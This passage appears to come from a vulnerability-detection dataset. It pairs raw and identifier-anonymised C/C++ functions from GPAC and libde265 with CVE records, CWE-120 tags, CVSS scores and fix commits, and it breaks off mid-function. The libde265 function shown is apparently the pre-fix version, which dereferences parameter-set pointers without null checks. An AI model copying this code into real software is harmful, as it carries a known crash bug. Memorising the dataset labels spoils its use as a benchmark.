				bifs = 3;
			} else {
				bifs = 2;
			}

#ifndef GPAC_DISABLE_AV_PARSERS
			if (a_esd->decoderConfig && (a_esd->decoderConfig->objectTypeIndication == GF_CODECID_AAC_MPEG4)
				&& a_esd->decoderConfig->decoderSpecificInfo
				&& a_esd->decoderConfig->decoderSpecificInfo->data
			) {
				GF_M4ADecSpecInfo cfg;
				gf_m4a_get_config(a_esd->decoderConfig->decoderSpecificInfo->data, a_esd->decoderConfig->decoderSpecificInfo->dataLength, &cfg);
				audioPL = cfg.audioPL;
			}
#endif
		}
	}

	/*update video cfg if needed*/
	if (v_esd) gf_isom_change_mpeg4_description(mp4file, VideoTrack, 1, v_esd);
	if (a_esd) gf_isom_change_mpeg4_description(mp4file, AudioTrack, 1, a_esd);

	/*likely 3GP or other files...*/
	if ((!a_esd && AudioTrack) || (!v_esd && VideoTrack)) return GF_OK;

	//get the OD sample
	codec = gf_odf_codec_new();
	samp = gf_isom_sample_new();
	gf_odf_codec_add_com(codec, (GF_ODCom *)odU);
	gf_odf_codec_encode(codec, 1);
	gf_odf_codec_get_au(codec, &samp->data, &samp->dataLength);
	gf_odf_codec_del(codec);
	samp->CTS_Offset = 0;
	samp->DTS = 0;
	samp->IsRAP = RAP;

	/*create the OD track*/
	odT = gf_isom_new_track(mp4file, odID, GF_ISOM_MEDIA_OD, gf_isom_get_timescale(mp4file));
	if (!odT) return gf_isom_last_error(mp4file);

	_esd = gf_odf_desc_esd_new(SLPredef_MP4);
	if (!_esd) return GF_OUT_OF_MEM;

	_esd->decoderConfig->bufferSizeDB = samp->dataLength;
	_esd->decoderConfig->objectTypeIndication = GF_CODECID_OD_V1;
	_esd->decoderConfig->streamType = GF_STREAM_OD;
	_esd->ESID = odID;
	_esd->OCRESID = no_ocr ? 0 : bifsID;
	gf_isom_new_mpeg4_description(mp4file, odT, _esd, NULL, NULL, &descIndex);
	gf_odf_desc_del((GF_Descriptor *)_esd);
	gf_isom_add_sample(mp4file, odT, 1, samp);
	gf_isom_sample_del(&samp);

	gf_isom_set_track_interleaving_group(mp4file, odT, 1);

	/*create the BIFS track*/
	bifsT = gf_isom_new_track(mp4file, bifsID, GF_ISOM_MEDIA_SCENE, gf_isom_get_timescale(mp4file));
	if (!bifsT) return gf_isom_last_error(mp4file);

	_esd = gf_odf_desc_esd_new(SLPredef_MP4);
	if (!_esd) return GF_OUT_OF_MEM;

	_esd->decoderConfig->bufferSizeDB = 20;
	_esd->decoderConfig->objectTypeIndication = GF_CODECID_BIFS_V2;
	_esd->decoderConfig->streamType = GF_STREAM_SCENE;
	_esd->ESID = bifsID;
	_esd->OCRESID = 0;

	/*rewrite ISMA BIFS cfg*/
	bs = gf_bs_new(NULL, 0, GF_BITSTREAM_WRITE);
	/*empty bifs stuff*/
	gf_bs_write_int(bs, 0, 17);
	/*command stream*/
	gf_bs_write_int(bs, 1, 1);
	/*in pixel metrics*/
	gf_bs_write_int(bs, 1, 1);
	/*with size*/
	gf_bs_write_int(bs, 1, 1);
	gf_bs_write_int(bs, w, 16);
	gf_bs_write_int(bs, h, 16);
	gf_bs_align(bs);
	gf_bs_get_content(bs, &_esd->decoderConfig->decoderSpecificInfo->data, &_esd->decoderConfig->decoderSpecificInfo->dataLength);
	gf_isom_new_mpeg4_description(mp4file, bifsT, _esd, NULL, NULL, &descIndex);
	gf_odf_desc_del((GF_Descriptor *)_esd);
	gf_bs_del(bs);
	gf_isom_set_visual_info(mp4file, bifsT, descIndex, w, h);

	samp = gf_isom_sample_new();
	samp->CTS_Offset = 0;
	samp->DTS = 0;
	switch (bifs) {
	case 1:
		if (is_image) {
			samp->data = (char *) ISMA_BIFS_IMAGE;
			samp->dataLength = 10;
		} else {
			samp->data = (char *) ISMA_GF_BIFS_VIDEO;
			samp->dataLength = 11;
		}
		break;
	case 2:
		if (is_image) {
			samp->data = (char *) ISMA_BIFS_AI;
			samp->dataLength = 15;
		} else {
			samp->data = (char *) ISMA_BIFS_AV;
			samp->dataLength = 16;
		}
		break;
	case 3:
		samp->data = (char *) ISMA_BIFS_AUDIO;
		samp->dataLength = 8;
		break;
	}

	samp->IsRAP = RAP;

	gf_isom_add_sample(mp4file, bifsT, 1, samp);
	samp->data = NULL;
	gf_isom_sample_del(&samp);
	gf_isom_set_track_interleaving_group(mp4file, bifsT, 1);

	gf_isom_set_track_enabled(mp4file, bifsT, GF_TRUE);
	gf_isom_set_track_enabled(mp4file, odT, GF_TRUE);
	gf_isom_add_track_to_root_od(mp4file, bifsT);
	gf_isom_add_track_to_root_od(mp4file, odT);

	gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_SCENE, 1);
	gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_GRAPHICS, 1);
	gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_OD, 1);
	gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_AUDIO, audioPL);
	gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_VISUAL, (u8) (is_image ? 0xFE : visualPL));

	gf_isom_set_brand_info(mp4file, GF_ISOM_BRAND_MP42, 1);
	gf_isom_modify_alternate_brand(mp4file, GF_ISOM_BRAND_ISOM, GF_TRUE);
	gf_isom_modify_alternate_brand(mp4file, GF_ISOM_BRAND_3GP5, GF_TRUE);
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_media_make_isma(GF_ISOFile *VAR_1, Bool VAR_2, Bool VAR_3, Bool VAR_4)
{
	u32 VAR_5, VAR_6, VAR_7, VAR_8, VAR_9, VAR_10, VAR_11, VAR_12, VAR_13, VAR_14, VAR_15, VAR_16;
	u32 VAR_17, VAR_18, VAR_19;
	Bool VAR_20, VAR_21;
	GF_ESD *VAR_22, *VAR_23, *VAR_24;
	GF_ObjectDescriptor *VAR_25;
	GF_ODUpdate *VAR_26;
	GF_ODCodec *VAR_27;
	GF_ISOSample *VAR_28;
	GF_BitStream *VAR_29;
	u8 VAR_30, VAR_31;

	switch (gf_isom_get_mode(VAR_1)) {
	case VAR_32:
	case VAR_33:
	case VAR_34:
		break;
	default:
		return VAR_35;
	}


	VAR_7 = gf_isom_get_track_count(VAR_1);
	VAR_14 = VAR_13 = 0;
	VAR_20 = 0;

	/* COMMENT_0 */
	for (VAR_8=0; VAR_8<VAR_7; VAR_8++) {
		GF_ESD *VAR_36 = gf_isom_get_esd(VAR_1, VAR_8+1, 1);
		/* COMMENT_1 */
		gf_isom_remove_track_from_root_od(VAR_1, VAR_8+1);

		VAR_9 = gf_isom_get_media_type(VAR_1, VAR_8+1);
		switch (VAR_9) {
		case VAR_37:
        case VAR_38:
        case VAR_39:
			VAR_21 = 0;
			if (VAR_36 && VAR_36->decoderConfig && ((VAR_36->decoderConfig->objectTypeIndication==VAR_40) || (VAR_36->decoderConfig->objectTypeIndication==VAR_41)) )
				VAR_21 = 1;

			/* COMMENT_2 */
			if (VAR_3 || !VAR_21) {
				/* COMMENT_3 */
				if (VAR_13) {
					if (VAR_36) gf_odf_desc_del((GF_Descriptor*)VAR_36);
					GF_LOG(VAR_42, VAR_43, (""[ISMA convert] More than one video track found, cannot convert file - remove extra track(s)\n""));
					return VAR_44;
				}
				VAR_13 = gf_isom_get_track_id(VAR_1, VAR_8+1);
				VAR_20 = VAR_21;
			} else {
				GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Visual track ID %d: only one sample found, assuming image and removing track\n"", gf_isom_get_track_id(VAR_1, VAR_8+1) ) );
				gf_isom_remove_track(VAR_1, VAR_8+1);
				VAR_8 -= 1;
				VAR_7 = gf_isom_get_track_count(VAR_1);
			}
			break;
		case VAR_46:
			if (VAR_14) {
				if (VAR_36) gf_odf_desc_del((GF_Descriptor*)VAR_36);
				GF_LOG(VAR_42, VAR_43, (""[ISMA convert] More than one audio track found, cannot convert file - remove extra track(s)\n"") );
				return VAR_44;
			}
			VAR_14 = gf_isom_get_track_id(VAR_1, VAR_8+1);
			break;
		/* COMMENT_4 */
		default:
			if (VAR_9==VAR_47) {
				GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Removing Hint track ID %d\n"", gf_isom_get_track_id(VAR_1, VAR_8+1) ));
			} else {
				GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Removing track ID %d\n"", gf_isom_get_track_id(VAR_1, VAR_8+1) ));
			}
			gf_isom_remove_track(VAR_1, VAR_8+1);
			VAR_8 -= 1;
			VAR_7 = gf_isom_get_track_count(VAR_1);
			break;
		}
		if (VAR_36) gf_odf_desc_del((GF_Descriptor*)VAR_36);
	}
	/* COMMENT_5 */
	if (!VAR_14 && !VAR_13) return VAR_48;

	/* COMMENT_6 */
	VAR_31 = 0xFE;
	VAR_30 = 0xFE;

	VAR_25 = (GF_ObjectDescriptor *) gf_isom_get_root_od(VAR_1);
	if (VAR_25 && (VAR_25->tag==VAR_49)) {
		VAR_30 = ((GF_InitialObjectDescriptor*)VAR_25)->audio_profileAndLevel;
		VAR_31 = ((GF_InitialObjectDescriptor*)VAR_25)->visual_profileAndLevel;
	}
	if (VAR_25) gf_odf_desc_del((GF_Descriptor *)VAR_25);


	/* COMMENT_7 */
	VAR_17 = 0;
	VAR_26 = (GF_ODUpdate *) gf_odf_com_new(VAR_50);

	VAR_22 = VAR_23 = NULL;

	gf_isom_set_root_od_id(VAR_1, 1);

	VAR_15 = 1;
	VAR_16 = 2;
	if (VAR_2) {
		VAR_15 = 1;
		while ((VAR_15==VAR_14) || (VAR_15==VAR_13)) VAR_15++;
		VAR_16 = 2;
		while ((VAR_16==VAR_14) || (VAR_16==VAR_13) || (VAR_16==VAR_15)) VAR_16++;

	}

	VAR_6 = gf_isom_get_track_by_id(VAR_1, VAR_13);
	VAR_5 = gf_isom_get_track_by_id(VAR_1, VAR_14);

	VAR_18 = VAR_19 = 0;
	if (VAR_6) {
		VAR_17 = 1;
		VAR_25 = (GF_ObjectDescriptor *) gf_odf_desc_new(VAR_51);
		VAR_25->objectDescriptorID = VAR_52;

		if (!VAR_2 && (VAR_13 != VAR_53)) {
			gf_isom_set_track_id(VAR_1, VAR_6, VAR_53);
		}

		VAR_23 = gf_isom_get_esd(VAR_1, VAR_6, 1);
		if (VAR_23) {
			VAR_23->OCRESID = VAR_4 ? 0 : VAR_15;

			gf_odf_desc_add_desc((GF_Descriptor *)VAR_25, (GF_Descriptor *)VAR_23);
			gf_list_add(VAR_26->objectDescriptors, VAR_25);

			gf_isom_get_track_layout_info(VAR_1, VAR_6, &VAR_18, &VAR_19, NULL, NULL, NULL);
			if (!VAR_18 || !VAR_19) {
				gf_isom_get_visual_info(VAR_1, VAR_6, 1, &VAR_18, &VAR_19);
#ifndef VAR_54
				if (VAR_23->decoderConfig
					&& (VAR_23->decoderConfig->objectTypeIndication==VAR_55)
					&& (VAR_23->decoderConfig->streamType==VAR_56)
					&& VAR_23->decoderConfig->decoderSpecificInfo
					&& VAR_23->decoderConfig->decoderSpecificInfo->data
				) {
					GF_M4VDecSpecInfo VAR_57;
					gf_m4v_get_config(VAR_23->decoderConfig->decoderSpecificInfo->data, VAR_23->decoderConfig->decoderSpecificInfo->dataLength, &VAR_57);
					if (!VAR_20 && (!VAR_18 || !VAR_19)) {
						VAR_18 = VAR_57.width;
						VAR_19 = VAR_57.height;
						gf_isom_set_visual_info(VAR_1, VAR_6, 1, VAR_18, VAR_19);
						GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Adjusting visual track size to %d x %d\n"", VAR_18, VAR_19));
					}
					if (VAR_57.par_num && VAR_57.par_den && (VAR_57.par_den!=VAR_57.par_num)) {
						VAR_18 *= VAR_57.par_num;
						VAR_18 /= VAR_57.par_den;
					}
					if (VAR_57.VideoPL) VAR_31 = VAR_57.VideoPL;
				}
#endif
			}
		}
	}

	if (VAR_5) {
		VAR_25 = (GF_ObjectDescriptor *) gf_odf_desc_new(VAR_51);
		VAR_25->objectDescriptorID = VAR_58;

		if (!VAR_2 && (VAR_14 != VAR_59)) {
			gf_isom_set_track_id(VAR_1, VAR_5, VAR_59);
		}

		VAR_22 = gf_isom_get_esd(VAR_1, VAR_5, 1);
		if (VAR_22) {
			VAR_22->OCRESID = VAR_4 ? 0 : VAR_15;

			if (!VAR_2) VAR_22->ESID = VAR_59;
			gf_odf_desc_add_desc((GF_Descriptor *)VAR_25, (GF_Descriptor *)VAR_22);
			gf_list_add(VAR_26->objectDescriptors, VAR_25);
			if (!VAR_17) {
				VAR_17 = 3;
			} else {
				VAR_17 = 2;
			}

#ifndef VAR_54
			if (VAR_22->decoderConfig && (VAR_22->decoderConfig->objectTypeIndication == VAR_60)
				&& VAR_22->decoderConfig->decoderSpecificInfo
				&& VAR_22->decoderConfig->decoderSpecificInfo->data
			) {
				GF_M4ADecSpecInfo VAR_61;
				gf_m4a_get_config(VAR_22->decoderConfig->decoderSpecificInfo->data, VAR_22->decoderConfig->decoderSpecificInfo->dataLength, &VAR_61);
				VAR_30 = VAR_61.audioPL;
			}
#endif
		}
	}

	/* COMMENT_8 */
	if (VAR_23) gf_isom_change_mpeg4_description(VAR_1, VAR_6, 1, VAR_23);
	if (VAR_22) gf_isom_change_mpeg4_description(VAR_1, VAR_5, 1, VAR_22);

	/* COMMENT_9 */
	if ((!VAR_22 && VAR_5) || (!VAR_23 && VAR_6)) return VAR_48;

	/* COMMENT_10 */
	VAR_27 = gf_odf_codec_new();
	VAR_28 = gf_isom_sample_new();
	gf_odf_codec_add_com(VAR_27, (GF_ODCom *)VAR_26);
	gf_odf_codec_encode(VAR_27, 1);
	gf_odf_codec_get_au(VAR_27, &VAR_28->data, &VAR_28->dataLength);
	gf_odf_codec_del(VAR_27);
	VAR_28->CTS_Offset = 0;
	VAR_28->DTS = 0;
	VAR_28->IsRAP = VAR_62;

	/* COMMENT_11 */
	VAR_11 = gf_isom_new_track(VAR_1, VAR_16, VAR_63, gf_isom_get_timescale(VAR_1));
	if (!VAR_11) return gf_isom_last_error(VAR_1);

	VAR_24 = gf_odf_desc_esd_new(VAR_64);
	if (!VAR_24) return VAR_65;

	VAR_24->decoderConfig->bufferSizeDB = VAR_28->dataLength;
	VAR_24->decoderConfig->objectTypeIndication = VAR_66;
	VAR_24->decoderConfig->streamType = VAR_67;
	VAR_24->ESID = VAR_16;
	VAR_24->OCRESID = VAR_4 ? 0 : VAR_15;
	gf_isom_new_mpeg4_description(VAR_1, VAR_11, VAR_24, NULL, NULL, &VAR_12);
	gf_odf_desc_del((GF_Descriptor *)VAR_24);
	gf_isom_add_sample(VAR_1, VAR_11, 1, VAR_28);
	gf_isom_sample_del(&VAR_28);

	gf_isom_set_track_interleaving_group(VAR_1, VAR_11, 1);

	/* COMMENT_12 */
	VAR_10 = gf_isom_new_track(VAR_1, VAR_15, VAR_68, gf_isom_get_timescale(VAR_1));
	if (!VAR_10) return gf_isom_last_error(VAR_1);

	VAR_24 = gf_odf_desc_esd_new(VAR_64);
	if (!VAR_24) return VAR_65;

	VAR_24->decoderConfig->bufferSizeDB = 20;
	VAR_24->decoderConfig->objectTypeIndication = VAR_69;
	VAR_24->decoderConfig->streamType = VAR_70;
	VAR_24->ESID = VAR_15;
	VAR_24->OCRESID = 0;

	/* COMMENT_13 */
	VAR_29 = gf_bs_new(NULL, 0, VAR_71);
	/* COMMENT_14 */
	gf_bs_write_int(VAR_29, 0, 17);
	/* COMMENT_15 */
	gf_bs_write_int(VAR_29, 1, 1);
	/* COMMENT_16 */
	gf_bs_write_int(VAR_29, 1, 1);
	/* COMMENT_17 */
	gf_bs_write_int(VAR_29, 1, 1);
	gf_bs_write_int(VAR_29, VAR_18, 16);
	gf_bs_write_int(VAR_29, VAR_19, 16);
	gf_bs_align(VAR_29);
	gf_bs_get_content(VAR_29, &VAR_24->decoderConfig->decoderSpecificInfo->data, &VAR_24->decoderConfig->decoderSpecificInfo->dataLength);
	gf_isom_new_mpeg4_description(VAR_1, VAR_10, VAR_24, NULL, NULL, &VAR_12);
	gf_odf_desc_del((GF_Descriptor *)VAR_24);
	gf_bs_del(VAR_29);
	gf_isom_set_visual_info(VAR_1, VAR_10, VAR_12, VAR_18, VAR_19);

	VAR_28 = gf_isom_sample_new();
	VAR_28->CTS_Offset = 0;
	VAR_28->DTS = 0;
	switch (VAR_17) {
	case 1:
		if (VAR_20) {
			VAR_28->data = (char *) VAR_72;
			VAR_28->dataLength = 10;
		} else {
			VAR_28->data = (char *) VAR_73;
			VAR_28->dataLength = 11;
		}
		break;
	case 2:
		if (VAR_20) {
			VAR_28->data = (char *) VAR_74;
			VAR_28->dataLength = 15;
		} else {
			VAR_28->data = (char *) VAR_75;
			VAR_28->dataLength = 16;
		}
		break;
	case 3:
		VAR_28->data = (char *) VAR_76;
		VAR_28->dataLength = 8;
		break;
	}

	VAR_28->IsRAP = VAR_62;

	gf_isom_add_sample(VAR_1, VAR_10, 1, VAR_28);
	VAR_28->data = NULL;
	gf_isom_sample_del(&VAR_28);
	gf_isom_set_track_interleaving_group(VAR_1, VAR_10, 1);

	gf_isom_set_track_enabled(VAR_1, VAR_10, VAR_77);
	gf_isom_set_track_enabled(VAR_1, VAR_11, VAR_77);
	gf_isom_add_track_to_root_od(VAR_1, VAR_10);
	gf_isom_add_track_to_root_od(VAR_1, VAR_11);

	gf_isom_set_pl_indication(VAR_1, VAR_78, 1);
	gf_isom_set_pl_indication(VAR_1, VAR_79, 1);
	gf_isom_set_pl_indication(VAR_1, VAR_80, 1);
	gf_isom_set_pl_indication(VAR_1, VAR_81, VAR_30);
	gf_isom_set_pl_indication(VAR_1, VAR_82, (u8) (VAR_20 ? 0xFE : VAR_31));

	gf_isom_set_brand_info(VAR_1, VAR_83, 1);
	gf_isom_modify_alternate_brand(VAR_1, VAR_84, VAR_77);
	gf_isom_modify_alternate_brand(VAR_1, VAR_85, VAR_77);
	return VAR_48;
}",,"--- func_before
+++ func_after
@@ -239,7 +239,7 @@
 
 	_esd = gf_odf_desc_esd_new(SLPredef_MP4);
 	if (!_esd) return GF_OUT_OF_MEM;
-	
+
 	_esd->decoderConfig->bufferSizeDB = 20;
 	_esd->decoderConfig->objectTypeIndication = GF_CODECID_BIFS_V2;
 	_esd->decoderConfig->streamType = GF_STREAM_SCENE;","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,GPAC 2.3-DEV-rev605-gfc9e29089-master contains a SEGV in gpac/MP4Box in gf_media_change_pl /afltest/gpac/src/media_tools/isom_tools.c:3293:42.,5.5,MEDIUM,1,valid,2023-10-26T10:27:53Z,4
CVE-2023-47471,['CWE-120'],CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,strukturag/libde265,null-pointer check in debug output (fixes #426),e36b4a1b0bafa53df47514c419d5be3e8916ebc7,https://github.com/strukturag/libde265/commit/e36b4a1b0bafa53df47514c419d5be3e8916ebc7,libde265/slice.cc,slice_segment_header::dump_slice_segment_header,"void slice_segment_header::dump_slice_segment_header(const decoder_context* ctx, int fd) const
{
FILE* fh;
if (fd==1) fh=stdout;
else if (fd==2) fh=stderr;
else { return; }
#define LOG0(t) log2fh(fh, t)
#define LOG1(t,d) log2fh(fh, t,d)
#define LOG2(t,d1,d2) log2fh(fh, t,d1,d2)
#define LOG3(t,d1,d2,d3) log2fh(fh, t,d1,d2,d3)
#define LOG4(t,d1,d2,d3,d4) log2fh(fh, t,d1,d2,d3,d4)
const pic_parameter_set* pps = ctx->get_pps(slice_pic_parameter_set_id);
assert(pps->pps_read); 
const seq_parameter_set* sps = ctx->get_sps((int)pps->seq_parameter_set_id);
assert(sps->sps_read); 
LOG0(""----------------- SLICE -----------------\n"");
LOG1(""first_slice_segment_in_pic_flag      : %d\n"", first_slice_segment_in_pic_flag);
if (ctx->get_nal_unit_type() >= NAL_UNIT_BLA_W_LP &&
ctx->get_nal_unit_type() <= NAL_UNIT_RESERVED_IRAP_VCL23) {
LOG1(""no_output_of_prior_pics_flag         : %d\n"", no_output_of_prior_pics_flag);
}
LOG1(""slice_pic_parameter_set_id           : %d\n"", slice_pic_parameter_set_id);
if (!first_slice_segment_in_pic_flag) {
LOG1(""dependent_slice_segment_flag         : %d\n"", dependent_slice_segment_flag);
LOG1(""slice_segment_address                : %d\n"", slice_segment_address);
}
{
LOG1(""slice_type                           : %c\n"",
slice_type == 0 ? 'B' :
slice_type == 1 ? 'P' : 'I');
if (pps->output_flag_present_flag) {
LOG1(""pic_output_flag                      : %d\n"", pic_output_flag);
}
if (sps->separate_colour_plane_flag == 1) {
LOG1(""colour_plane_id                      : %d\n"", colour_plane_id);
}
LOG1(""slice_pic_order_cnt_lsb              : %d\n"", slice_pic_order_cnt_lsb);
if (ctx->get_nal_unit_type() != NAL_UNIT_IDR_W_RADL &&
ctx->get_nal_unit_type() != NAL_UNIT_IDR_N_LP) {
LOG1(""short_term_ref_pic_set_sps_flag      : %d\n"", short_term_ref_pic_set_sps_flag);
if (!short_term_ref_pic_set_sps_flag) {
LOG1(""ref_pic_set[ %2d ]: "",sps->num_short_term_ref_pic_sets());
dump_compact_short_term_ref_pic_set(&slice_ref_pic_set, 16, fh);
}
else if (sps->num_short_term_ref_pic_sets() > 1) {
LOG1(""short_term_ref_pic_set_idx           : %d\n"", short_term_ref_pic_set_idx);
dump_compact_short_term_ref_pic_set(&sps->ref_pic_sets[short_term_ref_pic_set_idx], 16, fh);
}
if (sps->long_term_ref_pics_present_flag) {
if (sps->num_long_term_ref_pics_sps > 0) {
LOG1(""num_long_term_sps                        : %d\n"", num_long_term_sps);
}
LOG1(""num_long_term_pics                       : %d\n"", num_long_term_pics);
#if 0
for (int i=0; i<num_long_term_sps + num_long_term_pics; i++) {
LOG2(""PocLsbLt[%d]            : %d\n"", i, ctx->PocLsbLt[i]);
LOG2(""UsedByCurrPicLt[%d]     : %d\n"", i, ctx->UsedByCurrPicLt[i]);
LOG2(""DeltaPocMsbCycleLt[%d]  : %d\n"", i, ctx->DeltaPocMsbCycleLt[i]);
}
#endif
}
if (sps->sps_temporal_mvp_enabled_flag) {
LOG1(""slice_temporal_mvp_enabled_flag : %d\n"", slice_temporal_mvp_enabled_flag);
}
}
if (sps->sample_adaptive_offset_enabled_flag) {
LOG1(""slice_sao_luma_flag             : %d\n"", slice_sao_luma_flag);
LOG1(""slice_sao_chroma_flag           : %d\n"", slice_sao_chroma_flag);
}
if (slice_type == SLICE_TYPE_P || slice_type == SLICE_TYPE_B) {
LOG1(""num_ref_idx_active_override_flag : %d\n"", num_ref_idx_active_override_flag);
LOG2(""num_ref_idx_l0_active          : %d %s\n"", num_ref_idx_l0_active,
num_ref_idx_active_override_flag ? """" : ""(from PPS)"");
if (slice_type == SLICE_TYPE_B) {
LOG2(""num_ref_idx_l1_active          : %d %s\n"", num_ref_idx_l1_active,
num_ref_idx_active_override_flag ? """" : ""(from PPS)"");
}
if (pps->lists_modification_present_flag && NumPocTotalCurr > 1)
{
LOG1(""ref_pic_list_modification_flag_l0 : %d\n"", ref_pic_list_modification_flag_l0);
if (ref_pic_list_modification_flag_l0) {
for (int i=0;i<num_ref_idx_l0_active;i++) {
LOG2(""  %d: %d\n"",i,list_entry_l0[i]);
}
}
LOG1(""ref_pic_list_modification_flag_l1 : %d\n"", ref_pic_list_modification_flag_l1);
if (ref_pic_list_modification_flag_l1) {
for (int i=0;i<num_ref_idx_l1_active;i++) {
LOG2(""  %d: %d\n"",i,list_entry_l1[i]);
}
}
}
if (slice_type == SLICE_TYPE_B) {
LOG1(""mvd_l1_zero_flag               : %d\n"", mvd_l1_zero_flag);
}
LOG1(""cabac_init_flag                : %d\n"", cabac_init_flag);
if (slice_temporal_mvp_enabled_flag) {
LOG1(""collocated_from_l0_flag        : %d\n"", collocated_from_l0_flag);
LOG1(""collocated_ref_idx             : %d\n"", collocated_ref_idx);
}
if ((pps->weighted_pred_flag   && slice_type == SLICE_TYPE_P) ||
(pps->weighted_bipred_flag && slice_type == SLICE_TYPE_B))
{
LOG1(""luma_log2_weight_denom         : %d\n"", luma_log2_weight_denom);
if (sps->chroma_format_idc != 0) {
LOG1(""ChromaLog2WeightDenom          : %d\n"", ChromaLog2WeightDenom);
}
for (int l=0;l<=1;l++)
if (l==0 || (l==1 && slice_type == SLICE_TYPE_B))
{
int num_ref = (l==0 ?
num_ref_idx_l0_active-1 :
num_ref_idx_l1_active-1);
if (false) {                   for (int i=0;i<=num_ref;i++) {
LOG3(""luma_weight_flag_l%d[%d]        : %d\n"",l,i,luma_weight_flag[l][i]);
}
if (sps->chroma_format_idc != 0) {
for (int i=0;i<=num_ref;i++) {
LOG3(""chroma_weight_flag_l%d[%d]      : %d\n"",l,i,chroma_weight_flag[l][i]);
}
}
}
for (int i=0;i<=num_ref;i++) {
LOG3(""LumaWeight_L%d[%d]             : %d\n"",l,i,LumaWeight[l][i]);
LOG3(""luma_offset_l%d[%d]            : %d\n"",l,i,luma_offset[l][i]);
for (int j=0;j<2;j++) {
LOG4(""ChromaWeight_L%d[%d][%d]        : %d\n"",l,i,j,ChromaWeight[l][i][j]);
LOG4(""ChromaOffset_L%d[%d][%d]        : %d\n"",l,i,j,ChromaOffset[l][i][j]);
}
}
}
}
LOG1(""five_minus_max_num_merge_cand  : %d\n"", five_minus_max_num_merge_cand);
}
LOG1(""slice_qp_delta         : %d\n"", slice_qp_delta);
if (pps->pps_slice_chroma_qp_offsets_present_flag) {
LOG1(""slice_cb_qp_offset     : %d\n"", slice_cb_qp_offset);
LOG1(""slice_cr_qp_offset     : %d\n"", slice_cr_qp_offset);
}
if (pps->deblocking_filter_override_enabled_flag) {
LOG1(""deblocking_filter_override_flag : %d\n"", deblocking_filter_override_flag);
}
LOG2(""slice_deblocking_filter_disabled_flag : %d %s\n"",
slice_deblocking_filter_disabled_flag,
(deblocking_filter_override_flag ? ""(override)"" : ""(from pps)""));
if (deblocking_filter_override_flag) {
if (!slice_deblocking_filter_disabled_flag) {
LOG1(""slice_beta_offset  : %d\n"", slice_beta_offset);
LOG1(""slice_tc_offset    : %d\n"", slice_tc_offset);
}
}
if (pps->pps_loop_filter_across_slices_enabled_flag  &&
(slice_sao_luma_flag || slice_sao_chroma_flag ||
!slice_deblocking_filter_disabled_flag)) {
LOG1(""slice_loop_filter_across_slices_enabled_flag : %d\n"",
slice_loop_filter_across_slices_enabled_flag);
}
}
if (pps->tiles_enabled_flag || pps->entropy_coding_sync_enabled_flag) {
LOG1(""num_entry_point_offsets    : %d\n"", num_entry_point_offsets);
if (num_entry_point_offsets > 0) {
LOG1(""offset_len                 : %d\n"", offset_len);
for (int i=0; i<num_entry_point_offsets; i++) {
LOG2(""entry point [%i] : %d\n"", i, entry_point_offset[i]);
}
}
}
#undef LOG0
#undef LOG1
#undef LOG2
#undef LOG3
#undef LOG4
}","void slice_segment_header::dump_slice_segment_header(const decoder_context* VAR_0, int VAR_1) const
{
FILE* VAR_2;
if (VAR_1==1) VAR_2=VAR_3;
else if (VAR_1==2) VAR_2=VAR_4;
else { return; }
#define LOG0(VAR_5) log2fh(fh, t)
#define LOG1(VAR_5,VAR_6) log2fh(fh, t,d)
#define LOG2(VAR_5,VAR_7,VAR_8) log2fh(fh, t,d1,d2)
#define LOG3(VAR_5,VAR_7,VAR_8,VAR_9) log2fh(fh, t,d1,d2,d3)
#define LOG4(VAR_5,VAR_7,VAR_8,VAR_9,VAR_10) log2fh(fh, t,d1,d2,d3,d4)
const pic_parameter_set* VAR_11 = VAR_0->get_pps(VAR_12);
assert(VAR_11->pps_read); 
const seq_parameter_set* VAR_13 = VAR_0->get_sps((int)VAR_11->seq_parameter_set_id);
assert(VAR_13->sps_read); 
LOG0(""----------------- SLICE -----------------\n"");
LOG1(""first_slice_segment_in_pic_flag      : %d\n"", VAR_14);
if (VAR_0->get_nal_unit_type() >= VAR_15 &&
VAR_0->get_nal_unit_type() <= VAR_16) {
LOG1(""no_output_of_prior_pics_flag         : %d\n"", VAR_17);
}
LOG1(""slice_pic_parameter_set_id           : %d\n"", VAR_12);
if (!VAR_14) {
LOG1(""dependent_slice_segment_flag         : %d\n"", VAR_18);
LOG1(""slice_segment_address                : %d\n"", VAR_19);
}
{
LOG1(""slice_type                           : %c\n"",
VAR_20 == 0 ? 'B' :
VAR_20 == 1 ? 'P' : 'I');
if (VAR_11->output_flag_present_flag) {
LOG1(""pic_output_flag                      : %d\n"", VAR_21);
}
if (VAR_13->separate_colour_plane_flag == 1) {
LOG1(""colour_plane_id                      : %d\n"", VAR_22);
}
LOG1(""slice_pic_order_cnt_lsb              : %d\n"", VAR_23);
if (VAR_0->get_nal_unit_type() != VAR_24 &&
VAR_0->get_nal_unit_type() != VAR_25) {
LOG1(""short_term_ref_pic_set_sps_flag      : %d\n"", VAR_26);
if (!VAR_26) {
LOG1(""ref_pic_set[ %2d ]: "",VAR_13->num_short_term_ref_pic_sets());
dump_compact_short_term_ref_pic_set(&VAR_27, 16, VAR_2);
}
else if (VAR_13->num_short_term_ref_pic_sets() > 1) {
LOG1(""short_term_ref_pic_set_idx           : %d\n"", VAR_28);
dump_compact_short_term_ref_pic_set(&VAR_13->ref_pic_sets[VAR_28], 16, VAR_2);
}
if (VAR_13->long_term_ref_pics_present_flag) {
if (VAR_13->num_long_term_ref_pics_sps > 0) {
LOG1(""num_long_term_sps                        : %d\n"", VAR_29);
}
LOG1(""num_long_term_pics                       : %d\n"", VAR_30);
#if 0
for (int VAR_31=0; VAR_31<VAR_29 + VAR_30; VAR_31++) {
LOG2(""PocLsbLt[%d]            : %d\n"", VAR_31, VAR_0->PocLsbLt[VAR_31]);
LOG2(""UsedByCurrPicLt[%d]     : %d\n"", VAR_31, VAR_0->UsedByCurrPicLt[VAR_31]);
LOG2(""DeltaPocMsbCycleLt[%d]  : %d\n"", VAR_31, VAR_0->DeltaPocMsbCycleLt[VAR_31]);
}
#endif
}
